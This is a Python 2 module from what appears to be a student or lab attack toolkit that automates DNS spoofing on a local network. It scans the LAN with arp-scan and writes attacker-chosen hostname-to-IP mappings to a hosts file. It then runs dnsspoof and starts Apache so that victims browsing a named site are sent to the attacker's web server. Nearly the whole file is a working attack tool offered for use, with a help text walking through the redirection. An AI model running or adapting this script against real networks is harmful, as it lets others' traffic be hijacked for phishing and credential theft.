#!/usr/bin/python

####################
# Module:   DNS-Spoofing
# Author:   S.Schuster
# Date:     2015/11/10
# Version:  1.0
#
# Description: Script for automation DNS-Spoofing in LAN with
# given Hostnames
#
###############################
# Log:
# 2015/11/10    S.S - Initial
# 2015/11/26    S.S - Version 1.0 implemented
################################


import os
import subprocess
import attackBase

class DNSSpoofing(attackBase.Attack):

	
	spoofedEntries = []
	hostsFile = "/usr/local/spoofedHosts"
	interface = "eth0"

	# Starts DNS-Spoofing
	def start(self):
		insertEntries = True	
		finishDNSSpoofing = "n"	

		print "### DNS-Spoofing ### \n\n"
		print "Available interfaces: "
		subprocess.call(["ls", "/sys/class/net"])

		interface = raw_input("Select interface: ")

		print "\n Scan hosts (LAN) ..."
		subprocess.call(["arp-scan", "--interface="+interface,  "--localnet"])
			
		print "Insert manipulated DNS-entries: \n\n (ESCAPE or EXIT with typing x \n"
		
		while insertEntries:
			dnsname   = raw_input("Please insert DNS-entry (e.g. www.thi.de): ")
			if dnsname == "x":
				insertEntries = False
				print "Insertion of manipulated DNS-entry finished!"
			else:
				ipAddress = raw_input("Please insert IP-address for given DNS-entry %s: " % dnsname)
							
				if ipAddress == "x":
					insertEntries = False
					print "Insertion of manipulated DNS-entries aborted! NOTICE: DNS-entry %s not saved because of missing IP-Address!" % dnsname
				else:
					self.spoofedEntries.append( (dnsname, ipAddress) )
					print "\n DNS-entry -> IP-address (%s, %s) successfully ADDEd! \n" % (dnsname, ipAddress)

		
		with open(self.hostsFile, "w") as hostsFile:
			for entry in self.spoofedEntries:
				dnsname, ipAddress = entry
				# Write DNS-Entries into seperated hosts-file
				hostsFile.write("\n"+ipAddress+"	"+dnsname)
		print "\n Hostsentries successfully added to local hosts-list! \n"

		print "Start with DNS-Spoofing"
		dnsspoofing = subprocess.Popen(["dnsspoof", "-i", self.interface, "-f", self.hostsFile], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		subprocess.call(["service", "apache2", "start"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		print "DNS-Spoofing finished :-)"

		while finishDNSSpoofing != "x":
			finishDNSSpoofing = raw_input("Terminate DNS-Spoofing with typing x: ")

		if finishDNSSpoofing == "x":
			dnsspoofing.terminate()
			subprocess.call(["service", "apache2", "stop"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			print "DNS-Spoofing finished!"
		
	def help(self):
		print "Tutorial how to use this script: \n", \
			"\n 1st step: \n", \
			"Select available interface, (default is eth0 or wlan0). Then network of selected interface will be scanned for hosts.", \
			"\n 2nd step: \n", \
			"Insert DNS-Entry that should be manipulated (e.g. If you want to redirect users in network from www.thi.de to your own", \
			"webpage, type in >>>www.thi.de<<< and press Enter. \n", \
			"After DNS-Entry was typed, you have to set the IP-address of your Webserver (in this scenario the IP-Address of Kali-Device).", \
			"When finished DNS-Entries<->IP-Address, please enter 'x'", \
			"\n 3rd step:", \
			"DNS-spoofing is started automatically and you can check this on another PC in the same network with browsing manipulated sites."

	def parameter(self, x, y):
		print "Summe: %d + %d = %d" % (x,y,x+y)
